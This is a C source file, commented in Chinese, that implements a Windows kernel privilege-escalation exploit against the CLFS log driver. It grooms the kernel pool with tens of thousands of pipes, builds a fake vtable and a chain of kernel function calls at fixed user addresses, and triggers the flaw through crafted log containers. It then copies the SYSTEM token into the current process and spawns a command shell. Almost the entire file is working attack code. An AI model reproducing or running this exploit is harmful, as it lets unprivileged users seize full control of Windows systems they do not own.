PHANDLE pipeBuffeA = 0;
PHANDLE pipeBuffeB = 0;
PHANDLE logFileBuffer = 0;
int ConstructPoolLayout(PVOID pBaseLog)
{

	PLOG("[-](ConstructPoolLayout) start \n");

	if (!pBaseLog)
	{
		PLOG("[-](ConstructPoolLayout) pBaseLog is NULL \n");
		return 1;
	
	}

	//申请管道句柄内存
	pipeBuffeA = (PHANDLE)malloc(0x5000 * 2 * sizeof(PHANDLE));
	if (!pipeBuffeA)
	{
		PLOG("[-](ConstructPoolLayout) pipeBuffeA malloc failed \n");
		return 1;

	}

	pipeBuffeB = (PHANDLE)malloc(0x4000 * 2 * sizeof(PHANDLE));
	if (!pipeBuffeB)
	{
		PLOG("[-](ConstructPoolLayout) pipeBuffeB malloc failed \n");
		return 1;

	}

	logFileBuffer = (PHANDLE)malloc(10 * sizeof(PHANDLE));
	if (!logFileBuffer)
	{
		PLOG("[-](ConstructPoolLayout) logFileBuffer malloc failed \n");
		return 1;

	}

	DWORD bytesRead, bytesWritten;
	int i = 0;

	PLOG("[+](ConstructPoolLayout) CreatePipe * 0x5000 \n");

	//创建0x5000个对象
	do {

		// 创建匿名管道
		if (!CreatePipe(&pipeBuffeA[i], &pipeBuffeA[i + 1], NULL, 96))
		{
			PLOG("[-](ConstructPoolLayout) Failed to create %d pipe (0x5000). Error code: %lu\n", i,GetLastError());
			pipeBuffeA[i] = INVALID_HANDLE_VALUE;
			pipeBuffeA[i + 1] = INVALID_HANDLE_VALUE;
		}
		
		i+=2;
	} while (i<0x5000*2);

	PLOG("[+](ConstructPoolLayout) CreatePipe * 0x4000 \n");

	i = 0;
	//创建0x4000个对象
	do {

		// 创建匿名管道
		if (!CreatePipe(&pipeBuffeB[i], &pipeBuffeB[i + 1], NULL, 96))
		{
			PLOG("[-](ConstructPoolLayout) Failed to create %d pipe (0x4000).. Error code: %lu\n", i,GetLastError());
			pipeBuffeB[i] = INVALID_HANDLE_VALUE;
			pipeBuffeB[i + 1] = INVALID_HANDLE_VALUE;
		}
		
		i += 2;
		
	} while (i < 0x4000 * 2);

	PLOG("[+](ConstructPoolLayout) pBaseLogArray \n");

	// 构造管道写入的数据
	PVOID pBaseLogArray[13] = { 0 };
	pBaseLogArray[0] = pBaseLog;
	pBaseLogArray[1] = pBaseLog;
	pBaseLogArray[2] = pBaseLog;
	pBaseLogArray[3] = pBaseLog;
	pBaseLogArray[4] = pBaseLog;
	pBaseLogArray[5] = pBaseLog;
	pBaseLogArray[6] = pBaseLog;
	pBaseLogArray[7] = pBaseLog;
	pBaseLogArray[8] = pBaseLog;
	pBaseLogArray[9] = pBaseLog;
	pBaseLogArray[10] = pBaseLog;
	pBaseLogArray[11] = pBaseLog;

	PLOG("[+](ConstructPoolLayout) WriteFile * 0x5000 \n");
	//申请缓冲0xA0池块1
	i = 0;
	do {

		//申请成功的句柄
		if (pipeBuffeA[i]!=INVALID_HANDLE_VALUE)
		{
			
			//分配缓冲区
			if (!WriteFile(pipeBuffeA[i+1], pBaseLogArray, 96, &bytesWritten, NULL))
			{
				PLOG("[-](ConstructPoolLayout) Failed to write to pipe%d  (0x5000). Error code: %lu. HANDLE: %p\n",i, GetLastError(), pipeBuffeA[i]);
				CloseHandle(pipeBuffeA[i]);
				CloseHandle(pipeBuffeA[i + 1]);
				pipeBuffeA[i] = INVALID_HANDLE_VALUE;
				pipeBuffeA[i + 1] = INVALID_HANDLE_VALUE;
				//return 1;
			}
		}
		i += 2;
	} while (i < 0x5000 * 2);


	PLOG("[+](ConstructPoolLayout) CloseHandle * 0x667 \n");
	//释放0x667个0xA0池
	i = 0x2000;
	int num = 0x667;
	do
	{
		CloseHandle(pipeBuffeA[i]);
		CloseHandle(pipeBuffeA[i + 1]);
		pipeBuffeA[i] = INVALID_HANDLE_VALUE;
		pipeBuffeA[i + 1] = INVALID_HANDLE_VALUE;
		i+=10;
		num--;
	} while (num);


	//打开10个日志文件，使其clfshelp占位刚刚释放的0xA0池
	for (i = 0; i < 10;i++)
	{
		logFileBuffer[i] = CreateLogFile(logName2[i], GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, 0);
		if (logFileBuffer[i] == INVALID_HANDLE_VALUE)
		{
			PLOG("[+](ConstructPoolLayout) CreateLogFile %d failed \n", i);
		}
	}

	PLOG("[+](ConstructPoolLayout) WriteFile * 0x4000 \n");
	//申请缓冲0xA0池块2
	i = 0;
	do {

		//申请成功的句柄
		if (pipeBuffeB[i] != INVALID_HANDLE_VALUE)
		{
	
			//分配缓冲区
			if (!WriteFile(pipeBuffeB[i+1], pBaseLogArray, 96, &bytesWritten, NULL))
			{
				PLOG("[-](ConstructPoolLayout) Failed to write to pipe%d (0x4000). Error code: %lu. HANDLE: %p\n", i, GetLastError(), pipeBuffeB[i]);
				CloseHandle(pipeBuffeB[i]);
				CloseHandle(pipeBuffeB[i + 1]);
				pipeBuffeB[i] = INVALID_HANDLE_VALUE;
				pipeBuffeB[i + 1] = INVALID_HANDLE_VALUE;
				
			}
		}

		i += 2;
	} while (i < 0x4000 * 2);


	PLOG("[-](ConstructPoolLayout) end \n");


	return 0;

}



//构造函数调用布局
int ConstructFunctionLayout(int model,UINT64 writeAddress, UINT64 writeValue1, UINT64 writeValue2)
{
	if (!model)
	{
	

		InitKernelModulesFuncBase();


		//申请内存
		LPVOID pf50 = VirtualAlloc((LPVOID) 0x5000000, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (pf50)
		{
			PLOG("[+] Allocate 0x5000000 success\n");
		}
		else {
			PLOG("[-] Allocate 0x5000000 failed\n");
			return 1;
		}

		//申请内存
		LPVOID pff = VirtualAlloc((LPVOID)0xFFFFFFFF, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (pff)
		{
			PLOG("[+] Allocate 0xFFFFFFFF success\n");
		}
		else {
			PLOG("[-] Allocate 0xFFFFFFFF failed\n");
			return 1;
		}


		//构造函数布局
		//UINT64 G_ClfsEarlierLsn = 0;  //CLFS的ClfsEarlierLsn函数地址
		//UINT64 G_SeSetAccessStateGenericMapping = 0;  //ntos的SeSetAccessStateGenericMapping的函数地址
		//UINT64 G_ClfsMgmtDeregisterManagedClient = 0; //CLFS的ClfsMgmtDeregisterManagedClient函数地址
		//UINT64 G_PoFxProcessorNotification = 0; //ntos的PoFxProcessorNotification的函数地址

		*(PUINT64)0x5000030 = FileObject;  //内核地址，用于过检测

		*(PUINT64)0x5000000 = 0x5000100;  //虚表地址
		*(PUINT64)0x5000040 = 0x5000400;  //PoFxProcessorNotification中的mov     rax, [rcx+40h]
		*(PUINT64)0x5000048 = 0x5000800;  //PoFxProcessorNotification中的mov     rcx, [rcx+48h]
		*(PUINT64)0x5000100 = G_ClfsEarlierLsn;
		*(PUINT64)0x5000108 = G_PoFxProcessorNotification;
		*(PUINT64)(0x5000400+0x68) = G_ClfsMgmtDeregisterManagedClient;    //PoFxProcessorNotification中的mov     rax, [rax+68h]
		*(PUINT64)0x5000800 = 0x5000C00;  //ClfsMgmtDeregisterManagedClient的rcx
	
		*(PUINT64)(0x5000C00+0x28) = G_ClfsEarlierLsn;
		*(PUINT64)(0x5000C00 + 0x8) = G_SeSetAccessStateGenericMapping;

	}




	//	SeSetAccessStateGenericMapping 
	//	mov     rax, [rcx+48h]
	//	movups  xmm0, xmmword ptr[rdx]
	//	movdqu  xmmword ptr[rax + 8], xmm0
	//	retn - movdqu  xmmword ptr [rax+8], xmm0
	*(PUINT64)(0x5000800 + 0x48) = writeAddress-8;  //[rcx+48h]
												////因为[rax+8],因此要将最终的写入地址-8
	*(PUINT64)0xFFFFFFFF = writeValue1;		//xmm0为128位,16个字节
	*((PUINT64)0xFFFFFFFF+1) = writeValue2;

}




//****************************************************
int exp()
{

	LPVOID pFakeThis = (LPVOID)0x10000;
	LPVOID pFakeVtable = (LPVOID)0x5000000;
	LPVOID pOverValue = (LPVOID)0xffffffff;


	PVOID pBaseBlock;
	ULONGLONG cSize = 512;  //容器文件大小


	//
	// 泄露地址
	//
	DWORD64 current_EPROCESS = 0;  //当前进程的内核对象地址
	DWORD64 system_EPROCESS = 0;  //system进程的内核对象地址
	DWORD64 tokenAddress = 0;
	DWORD64 pPipeArbitrary = 0;  //指向管道属性


	//初始化API
	if (InitApi())
	{
		PLOG("[+](exp) Init Api success.\n");
	}
	else {

		PLOG("[-](exp) Init Api failed.\n");
		return 0;
	}


	//获取当前进程和SYSTEM进程内核地址
	if (GetEPROCESSInformation(&current_EPROCESS, &system_EPROCESS))
	{
		PLOG("[+] Get EPROCESS information success.\n");
	}
	else {

		PLOG("[-] Get EPROCESS information fail.\n");
	
	}


	//创建被漏洞修改的日志文件
	if (CreateCodeExecuteLogFile())
	{
		//创建失败
		PLOG("[-](exp) CreateCodeExecuteLogFile failed.\n");
		return 0;
	}

	//获取当前的0x7A00大小的CLFS池数组
	if(GetBaseBlockPtr(0, 0))
	{
		//创建失败
		PLOG("[-](exp) GetBaseBlockPtr 1 failed.\n");
		return 0;
	}


	// 打开后续被漏洞修改的日志文件
	HANDLE evilContainerLogFile = CreateLogFile(logName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, 0);
	if (evilContainerLogFile == INVALID_HANDLE_VALUE)
	{
		PLOG("[-](exp) CreateLogFile failed\n ");
		
	}


	//获取加载日志文件后的的0x7A00大小的CLFS池数组，从中检测新分配的内存地址
	if(GetBaseBlockPtr(1, &pBaseBlock))
	{
		//创建失败
		PLOG("[-](exp) GetBaseBlockPtr 2 failed.\n");
		return 0;
	}

	PLOG("[+](exp)pBaseBlock %p\n", pBaseBlock);


	//创建10个漏洞利用日志文件
	for (int i = 0; i < 10; i++)
	{
		if (CreateTriggerVulnerabilityLogFile(i))
		{
			PLOG("[-](exp)  CreateTriggerVulnerabilityLogFile %d failed\n",i);
			return 0;
		}
		else 
		{
			PLOG("[+](exp)  CreateTriggerVulnerabilityLogFile %d success\n", i);
		}
	}
	//构造池内存布局	
	if (ConstructPoolLayout((PVOID)((PCHAR)pBaseBlock+0x30))) //指向RecordOffsets[12]
	{
		PLOG("[-](exp) ConstructPoolLayout failed\n");
	}
	else
	{
		PLOG("[+](exp) ConstructPoolLayout success\n");
	}



	//获取管道对象指针
	if (GetPipeArbitraryPtr(&pPipeArbitrary))
	{
		PLOG("[+](exp) Get pipe arbitrary pointer success -> %p\n", (PVOID)pPipeArbitrary);
	}
	else {
		PLOG("[-](exp) Get pipe arbitrary pointer failed.\n");
	}

	//初始化函数调用布局
	PLOG("[+](exp) Init construct heap\n");
	GetFileObject();
	ConstructFunctionLayout(0, 0, 0, 0);

	//从第4个开始利用，前面几个分配不太靠谱
	for (int i = 4; i < 10; i++)
	{
		
		//调用AddLogContainer触发漏洞,修改容器偏移
		if (!AddLogContainer(logFileBuffer[i], &cSize, containerFileName, 0))
		{
			PLOG("[+](exp)  AddLogContainer %d failed\n",i);
		}


		//构造堆
		PLOG("[+](exp) First construct heap\n");
		ConstructFunctionLayout(1,  pPipeArbitrary + 32, system_EPROCESS & 0xFFFFFFFFFFFFF000, 0x414141414141005A);

		PLOG("[+](exp) First trigger vulnerability\n");
		//getchar();
		//尝试利用恶意容器,将 system_EPROCESS&0xFFFFFFFFFFFFF000 写入到 pPipeArbitrary+32
		CreateLogFile(logName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, 0);
		PLOG("[+](exp) First trigger end\n");

		//读取令牌
		tokenAddress = GetSystemToken(system_EPROCESS & 0xfff);
		if (tokenAddress && tokenAddress != 0x4141414141414141)
		{
			PLOG("[+](exp) Get system token success -> %p\n", tokenAddress);
		}
		else
		{
			PLOG("[-](exp) Get system token fail -> %p\n", tokenAddress);
			continue;
		}
		//getchar();




		//构造堆
		PLOG("[+](exp) Second construct heap\n");
		ConstructFunctionLayout(1,  current_EPROCESS + 0x4B8, tokenAddress, 0);

		//getchar();
		PLOG("[+](exp) Second trigger vulnerability\n");
		//尝试利用恶意容器，替换当前进程token
		CreateLogFile(logName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, 0);
		PLOG("[+](exp) Second trigger end\n");
		
		//检测当前权限
		if (GetUserFromProcess(GetCurrentProcessId()))
			return 1;  //已经提升到system

		

	}

	

	return 0;
}


int main(int argc, char* argv[])
{
	

	if (exp())
	{
		printf("exploit success");
		system("cmd");
	}
	else
	{
		printf("exploit fail");
	}
	


	



}
